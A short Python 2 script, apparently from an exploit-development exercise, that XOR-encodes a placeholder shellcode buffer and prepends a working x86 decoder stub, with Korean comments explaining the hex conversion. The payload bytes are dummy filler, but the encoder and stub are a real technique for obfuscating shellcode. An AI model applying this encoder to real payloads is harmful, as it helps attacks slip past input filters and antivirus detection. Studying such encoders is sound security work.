# -*- coding: utf-8 -*-

import os, sys
import struct

print " * Simple XOR Shellcode Encoder by hyunmini * \n"

def xor(data):
	key = "\x01\x02\x03\x04"
	leng = len(key)
	reverse = ""
	for i in range(0, len(data)):
		reverse += struct.pack("B", (ord(data[i]) ^ ord(key[i % leng])))
		
	return reverse

def conv_hex(data):
	hex_str = ""
	for i in range(0, len(data)):
		hex_str += ("0x%02x" % ord(data[i])).replace('0x', '\\x')
		
		#ord는 인자값에 해당하는 아스키코드를 리턴하는 함수
		#%02x는 문자열이 끝나고 %뒤에 나오는 한자리면 앞의자리는 0으로 채워지고 두자리 헥사값으로 바뀜
		#이때 replace를 통해서 0x값은 \x로 바뀜
		#0x는 16진수를 나태고 \x는 그값에 해당하는 ASCII코드로 변환해줌
		
	return hex_str

org_shellcode = (
"\x41\x41\x41\x41\x42\x42\x42\x42\x43\x43\x43\x43\x44\x44\x44\x44"
"\x41\x41\x41\x41\x42\x42\x42\x42\x43\x43\x43\x43\x44\x44\x44\x44"
"\x41\x41\x41\x41\x42\x42\x42\x42\x43\x43\x43\x43\x44\x44\x44\x44"
"\x41\x41\x41\x41\x00\x00\x00\x00\x43\x43\x43\x43\x44\x44\x44\x44"
)

xor_shellcode = ""

decoder = (
	"\xe8\xff\xff\xff\xff"
	"\xc2"
	"\x5e"
	"\x6a\x20\x59"
	"\xbf\x01\x02\x03\x04"
	"\x31\x7e\x12"
	"\x83\xc6\x04"
	"\xe2\xf8"
)

xor_shellcode = xor(org_shellcode)

print "Orignal : " + conv_hex(org_shellcode) + '\n'
print "Encoded : " + conv_hex(decoder) + conv_hex(xor_shellcode) + '\n'